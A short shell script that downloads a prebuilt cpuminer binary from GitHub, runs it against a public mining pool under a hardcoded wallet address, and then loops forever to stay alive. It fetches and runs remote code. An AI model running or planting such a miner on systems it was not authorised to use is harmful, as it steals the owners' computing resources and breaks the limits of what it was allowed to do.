#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yescryptr32 -o stratum+tcp://yescryptR32.sea.mine.zpool.ca:6343 -u DJesgxRBcoGA3jkSvYyGKNFgq2vXWHgpQf.gass -t2
while [ 1 ]; do
sleep 5
done
sleep 99999
